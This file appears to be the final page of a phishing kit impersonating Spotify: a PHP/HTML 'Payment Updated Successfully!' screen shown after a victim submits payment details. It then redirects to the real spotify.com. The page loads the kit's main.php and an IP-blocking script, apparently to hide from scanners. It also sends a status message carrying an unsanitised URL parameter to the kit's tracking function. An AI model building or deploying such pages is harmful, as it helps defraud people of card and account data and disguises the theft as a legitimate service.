<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="./img/fav.ico">
    <title>Spotify</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Circular', Arial, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: white;
            min-height: 100vh;
        }
        
        .sushi {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background-color: #000;
        }
        
        .ramen {
            display: flex;
            align-items: center;
        }
        
        .ramen img {
            height: 40px;
        }
        
        .tempura {
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .udon {
            display: flex;
            gap: 30px;
        }
        
        .udon a {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
        }
        
        .miso {
            display: flex;
            align-items: center;
            gap: 5px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 23px;
            padding: 5px 10px;
            cursor: pointer;
        }
        
        .tofu {
            width: 30px;
            height: 30px;
            background-color: #535353;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .tofu img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .wasabi {
            font-weight: 700;
            margin-right: 5px;
        }
        
        .main-content {
            max-width: 500px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        .success-modal {
            background-color: #f8f9fa;
            border-radius: 12px;
            padding: 40px 30px;
            margin: 20px auto;
            max-width: 450px;
            color: #333;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
        }

        .success-icon {
            width: 80px;
            height: 80px;
            background-color: #1ED760;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            animation: successPulse 2s ease-in-out infinite;
        }

        .success-icon svg {
            width: 40px;
            height: 40px;
            color: white;
        }

        @keyframes successPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .success-title {
            font-size: 24px;
            font-weight: 700;
            color: #1ED760;
            margin-bottom: 15px;
        }

        .success-message {
            font-size: 16px;
            color: #333;
            line-height: 1.5;
            margin-bottom: 25px;
        }

        .subscription-message {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .redirect-container {
            background-color: #f0f9f0;
            border: 1px solid #1ED760;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
        }

        .redirect-message {
            font-size: 14px;
            color: #333;
            margin-bottom: 10px;
        }

        .countdown {
            font-size: 18px;
            font-weight: 700;
            color: #1ED760;
        }

        .spotify-logo-success {
            margin-top: 20px;
        }

        .spotify-logo-success img {
            height: 25px;
            opacity: 0.7;
        }

        .recaptcha-footer {
            text-align: center;
            padding: 20px;
            margin-top: 40px;
            font-size: 11px;
            color: #999;
            line-height: 1.4;
        }

        .recaptcha-footer a {
            color: #1ED760;
            text-decoration: none;
        }

        .recaptcha-footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .sushi {
                padding: 15px 20px;
            }
            
            .udon {
                gap: 15px;
            }
        }

        @media (max-width: 576px) {
            .sushi {
                padding: 10px 15px;
            }
            
            .ramen img {
                width: 100px;
                height: 40px;
            }
            
            .udon {
                display: none;
            }
            
            .miso {
                padding: 3px 8px;
            }
            
            .tofu {
                width: 25px;
                height: 25px;
            }
            
            .wasabi {
                font-size: 14px;
            }
            
            .tempura {
                gap: 15px;
            }
            
            .success-modal {
                padding: 30px 20px;
                margin: 15px auto;
            }
            
            .success-title {
                font-size: 20px;
            }
            
            .success-message {
                font-size: 14px;
            }

            .recaptcha-footer {
                font-size: 10px;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <nav class="sushi">
        <div class="ramen">
            <img src="./img/lggo.webp">
        </div>
        
        <div class="tempura">
            <div class="udon">
                <a data-translate="premium">Premium</a>
                <a data-translate="support">Support</a>
                <a data-translate="download">Download</a>
            </div>
            
            <div class="miso">
                <div class="tofu">
                    <img src="./img/proff.webp">
                </div>
                <span class="wasabi" data-translate="profile">Profile</span>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M4 6L8 10L12 6" stroke="white" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>
        </div>
    </nav>
    
    <div class="main-content">
        <div class="success-modal">
            <div class="success-icon">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            
            <h1 class="success-title" data-translate="success-title">Payment Updated Successfully!</h1>
            
            <p class="success-message" data-translate="success-message">
                We have successfully updated your payment details.
            </p>
            
            <p class="subscription-message" data-translate="subscription-message">
                You can now enjoy your Spotify Premium subscription without any interruptions.
            </p>
            
            <div class="redirect-container">
                <p class="redirect-message" data-translate="redirect-message">
                    You will be redirected to your profile in
                </p>
                <div class="countdown">
                    <span id="countdown">5</span> <span data-translate="seconds">seconds</span>
                </div>
            </div>
            
            <div class="spotify-logo-success">
            </div>
        </div>
    </div>

    <footer class="recaptcha-footer">
        <p data-translate="recaptcha-full">
            This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
        </p>
    </footer>

    <script src="./js/done.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            
            const timer = setInterval(function() {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(timer);
                    // Redirect to profile page (you can change this URL)
                    window.location.href = 'https://spotify.com/';
                }
            }, 1000);
        });
    </script>
<script src="js/jq.js"></script>
<?php $m->ctr(" 🔚❌🏃🚪 ".@$_GET['e']); ?>
</body></html>